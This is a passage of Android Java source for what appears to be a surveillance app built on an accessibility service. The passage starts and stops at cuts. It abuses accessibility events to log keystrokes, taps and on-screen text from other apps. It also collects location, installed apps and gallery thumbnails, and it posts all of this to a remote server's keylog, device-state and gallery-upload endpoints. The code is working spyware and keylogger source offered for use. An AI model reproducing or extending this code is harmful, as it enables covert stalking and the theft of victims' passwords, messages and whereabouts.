                              String filename = videoCursor.getString(videoCursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME));
                              long dateAdded = videoCursor.getLong(videoCursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_ADDED));
                              long size = videoCursor.getLong(videoCursor.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE));
                              Bitmap thumb = MediaStore.Video.Thumbnails.getThumbnail(resolver, id, MediaStore.Video.Thumbnails.MINI_KIND, null);
                              String base64 = thumbnailToBase64(thumb);
                              JSONObject media = new JSONObject();
                              media.put("filename", filename);
                              media.put("timestamp", dateAdded * 1000);
                              media.put("size", size);
                              media.put("type", "video");
                              media.put("thumbnailBase64", base64 != null ? base64 : "");
                              mediaList.add(media);
                          }
                          videoCursor.close();
                      }
                      Collections.sort(mediaList, new Comparator<JSONObject>() {
                          @Override public int compare(JSONObject a, JSONObject b) {
                              try { return Long.compare(b.optLong("timestamp",0), a.optLong("timestamp",0)); } catch (Throwable t) { return 0; }
                          }
                      });
                      if (mediaList.size() > maxCount) mediaList = new ArrayList<>(mediaList.subList(0, maxCount));
                      JSONObject payload = new JSONObject();
                      payload.put("deviceId", deviceId);
                      payload.put("deviceToken", deviceToken);
                      payload.put("media", new JSONArray(mediaList));
                      RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), payload.toString());
                      Request request = new Request.Builder().url(API_BASE + "/api/gallery/upload").post(body).build();
                      httpClient.newCall(request).execute().close();
                  } catch (Throwable t) { Log.e(TAG, "fetchAndUploadGallery crash", t); }
              }

              private String thumbnailToBase64(Bitmap bitmap) {
                  if (bitmap == null) return null;
                  try {
                      ByteArrayOutputStream baos = new ByteArrayOutputStream();
                      bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
                      return Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
                  } catch (Throwable t) { return null; }
              }

              private void sendDeviceState(boolean forceFreshLocation) {
                  try {
                      String deviceName = Build.MANUFACTURER + " " + Build.MODEL;
                      int battery = getBatteryLevel();
                      List<InstalledApp> apps = getInstalledApps();
                      JSONArray appsArray = new JSONArray();
                      for (InstalledApp app : apps) {
                          JSONObject obj = new JSONObject();
                          obj.put("name", app.name);
                          obj.put("package", app.packageName);
                          appsArray.put(obj);
                      }
                      LocationResult loc = getCurrentLocation(forceFreshLocation);
                      JSONObject payload = new JSONObject();
                      payload.put("ownerEmail", OWNER_EMAIL);
                      payload.put("deviceId", deviceId);
                      payload.put("deviceToken", deviceToken);
                      payload.put("deviceName", deviceName);
                      payload.put("battery", battery);
                      payload.put("installedApps", appsArray);
                      if (loc != null) {
                          payload.put("latitude", loc.latitude);
                          payload.put("longitude", loc.longitude);
                          payload.put("accuracy", loc.accuracy);
                      }
                      RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), payload.toString());
                      Request request = new Request.Builder().url(API_BASE + "/api/device-state").post(body).build();
                      httpClient.newCall(request).execute().close();
                  } catch (Throwable t) { Log.e(TAG, "sendDeviceState crash", t); }
              }

              private LocationResult getCurrentLocation(boolean forceFresh) {
                  try {
                      LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
                      if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
                          ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) return null;
                      if (!forceFresh) {
                          Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                          if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                          if (loc != null) return new LocationResult(loc.getLatitude(), loc.getLongitude(), loc.hasAccuracy()?loc.getAccuracy():0);
                      }
                      final CountDownLatch latch = new CountDownLatch(1);
                      final LocationResult result = new LocationResult();
                      LocationListener listener = new LocationListener() {
                          @Override public void onLocationChanged(Location l) { if(l!=null){result.latitude=l.getLatitude();result.longitude=l.getLongitude();result.accuracy=l.hasAccuracy()?l.getAccuracy():0; latch.countDown();}}
                          @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
                          @Override public void onProviderEnabled(String provider) {}
                          @Override public void onProviderDisabled(String provider) {}
                      };
                      lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper());
                      lm.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, listener, Looper.getMainLooper());
                      latch.await(10, TimeUnit.SECONDS);
                      if (result.latitude !=0 || result.longitude !=0) return result;
                      return null;
                  } catch (Throwable t) { return null; }
              }

              private static class LocationResult { double latitude, longitude, accuracy; LocationResult(){} LocationResult(double lat,double lng,double acc){latitude=lat;longitude=lng;accuracy=acc;} }

              private int getBatteryLevel(){ try{ BatteryManager bm=(BatteryManager)getSystemService(BATTERY_SERVICE); if(bm!=null)return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);}catch(Throwable ignored){} return 0; }

              private List<InstalledApp> getInstalledApps(){ List<InstalledApp> list=new ArrayList<>(); try{ PackageManager pm=getPackageManager(); for(ApplicationInfo ai:pm.getInstalledApplications(0)){ if((ai.flags & ApplicationInfo.FLAG_SYSTEM)==0){ list.add(new InstalledApp(pm.getApplicationLabel(ai).toString(), ai.packageName)); } } }catch(Throwable ignored){} return list; }

              @Override public void onAccessibilityEvent(AccessibilityEvent event) {
                  try {
                      if(event==null)return;
                      switch(event.getEventType()){
                          case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                              if(event.getText()!=null && event.getText().size()>0){ String typedText=event.getText().get(0).toString(); if(!typedText.isEmpty()){ if(pendingText.length()==0){ pendingPackageName=event.getPackageName()!=null?event.getPackageName().toString():""; } pendingText.setLength(0); pendingText.append(typedText); } else { if(pendingText.length()>0){ String typed=pendingText.toString().trim(); String typedAppName=getAppDisplayName(pendingPackageName!=null?pendingPackageName:"Unknown"); sendKeylog("["+typedAppName+"] "+typed); pendingText.setLength(0); pendingPackageName=null; } } }
                              else { if(pendingText.length()>0){ String typed=pendingText.toString().trim(); String typedAppName=getAppDisplayName(pendingPackageName!=null?pendingPackageName:"Unknown"); sendKeylog("["+typedAppName+"] "+typed); pendingText.setLength(0); pendingPackageName=null; } }
                              break;
                          case AccessibilityEvent.TYPE_VIEW_CLICKED:
                              handleClick(event);
                              break;
                          case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                          case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                              String pkg = event.getPackageName()!=null?event.getPackageName().toString():"Unknown";
                              if(!isSystemPackage(pkg)){ scheduleScreenDataCapture(pkg); }
                              if(event.getEventType()==AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && pendingText.length()>0){ String typed=pendingText.toString().trim(); String typedAppName=getAppDisplayName(pendingPackageName!=null?pendingPackageName:pkg); sendKeylog("["+typedAppName+"] "+typed); pendingText.setLength(0); pendingPackageName=null; }
                              break;
                      }
                  } catch(Throwable t){ Log.e(TAG,"onAccessibilityEvent crash",t); }
              }

              private boolean isSystemPackage(String pkg){ if(pkg==null)return true; String lower=pkg.toLowerCase(); return lower.contains("systemui")||lower.contains("launcher")||lower.contains("miui.home")||lower.contains("nexuslauncher")||lower.contains("com.android.systemui")||lower.contains("com.android.launcher")||lower.contains("com.miui.home")||lower.contains("com.google.android.apps.nexuslauncher"); }

              private void handleClick(AccessibilityEvent event){ AccessibilityNodeInfo source=event.getSource(); String clickedText=""; if(source!=null){ clickedText=getNodeText(source); AccessibilityNodeInfo parent=source.getParent(); int depth=0; while(parent!=null && depth<6 && clickedText.isEmpty()){ clickedText=getNodeText(parent); if(!clickedText.isEmpty())break; parent=parent.getParent(); depth++; } source.recycle(); } String appName=getAppDisplayName(event.getPackageName()!=null?event.getPackageName().toString():"Unknown"); sendKeylog("👆 ["+appName+" Tapped] "+(clickedText.isEmpty()?"Unknown":clickedText)); if(pendingText.length()>0){ String typed=pendingText.toString().trim(); String typedAppName=getAppDisplayName(pendingPackageName!=null?pendingPackageName:appName); sendKeylog("["+typedAppName+"] "+typed); pendingText.setLength(0); pendingPackageName=null; } }

              private String getNodeText(AccessibilityNodeInfo node){ if(node==null)return ""; try{ String text=node.getText()!=null?node.getText().toString():""; if(text.isEmpty() && node.getContentDescription()!=null)text=node.getContentDescription().toString(); if(text.isEmpty() && node.getViewIdResourceName()!=null)text=node.getViewIdResourceName(); return text.trim(); }catch(Throwable t){return "";} }

              private void scheduleScreenDataCapture(String packageName){ if(screenDataRunnable!=null)mainHandler.removeCallbacks(screenDataRunnable); lastScreenPackageName=packageName; screenDataRunnable=()->{ try{ String appName=getAppDisplayName(lastScreenPackageName); captureAndSendScreenData(appName); }catch(Throwable t){ Log.e(TAG,"screen data capture crash",t); } }; mainHandler.postDelayed(screenDataRunnable,5000); }

              private void captureAndSendScreenData(String appName){ try{ AccessibilityNodeInfo root=getRootInActiveWindow(); if(root==null)return; String screenText=extractTextFromNode(root); if(screenText.isEmpty())return; if(screenText.length()>300)screenText=screenText.substring(0,300)+"..."; if(screenText.equals(lastSentScreenData))return; sendKeylog("🖥️ ["+appName+"] Screen Data: "+screenText); lastSentScreenData=screenText; }catch(Throwable t){ Log.e(TAG,"captureAndSendScreenData crash",t); } }

              private String getAppDisplayName(String packageName){ try{ PackageManager pm=getPackageManager(); ApplicationInfo ai=pm.getApplicationInfo(packageName,0); return pm.getApplicationLabel(ai).toString(); }catch(Throwable t){ return packageName; } }

              private String extractTextFromNode(AccessibilityNodeInfo node){ if(node==null)return ""; StringBuilder sb=new StringBuilder(); try{ String text=(node.getText()!=null)?node.getText().toString().trim():""; String desc=(node.getContentDescription()!=null)?node.getContentDescription().toString().trim():""; if(!text.isEmpty()){sb.append(text);}else if(!desc.isEmpty()){sb.append(desc);} for(int i=0;i<node.getChildCount();i++){ AccessibilityNodeInfo child=node.getChild(i); if(child!=null){ String childText=extractTextFromNode(child); if(!childText.isEmpty()){ if(sb.length()>0)sb.append(" | "); sb.append(childText); } child.recycle(); } } String[] parts=sb.toString().split(" \\| "); LinkedHashSet<String> uniqueParts=new LinkedHashSet<>(); for(String part:parts){ if(!part.trim().isEmpty())uniqueParts.add(part.trim()); } StringBuilder deduped=new StringBuilder(); int count=0; for(String part:uniqueParts){ if(count>0)deduped.append(" | "); deduped.append(part); count++; } return deduped.toString(); }catch(Throwable t){ return sb.toString(); } }

              private void sendKeylog(String text){ new Thread(()->{ try{ JSONObject payload=new JSONObject(); payload.put("deviceId",deviceId); payload.put("deviceToken",deviceToken); payload.put("text",text); payload.put("timestamp",System.currentTimeMillis()); RequestBody body=RequestBody.create(MediaType.parse("application/json; charset=utf-8"),payload.toString()); Request request=new Request.Builder().url(API_BASE+"/api/keylog").post(body).build(); httpClient.newCall(request).execute().close(); }catch(Throwable t){ } }).start(); }

              private void logToFile(String data){ try{ File dir=new File(getExternalFilesDir(null),"logs"); if(!dir.exists())dir.mkdirs(); FileWriter fw=new FileWriter(new File(dir,"keylog.txt"),true); fw.append(data).append("\n"); fw.close(); }catch(Throwable t){ } }

              @Override public void onInterrupt() {}

              @Override public void onDestroy(){
                  super.onDestroy();
                  try { unregisterReceiver(syncReceiver); } catch (Exception ignored) {}
                  if (cameraWs != null) cameraWs.close(1000, null);
                  if(deviceStateThread!=null && deviceStateThread.isAlive()) deviceStateThread.interrupt();
                  if(galleryPollerThread!=null && galleryPollerThread.isAlive()) galleryPollerThread.interrupt();
                  if(gpsRequestThread!=null && gpsRequestThread.isAlive()) gpsRequestThread.interrupt();
                  if(callContactsThread!=null && callContactsThread.isAlive()) callContactsThread.interrupt();
              }

              private static class InstalledApp { String name,packageName; InstalledApp(String n,String p){name=n;packageName=p;} }
          }
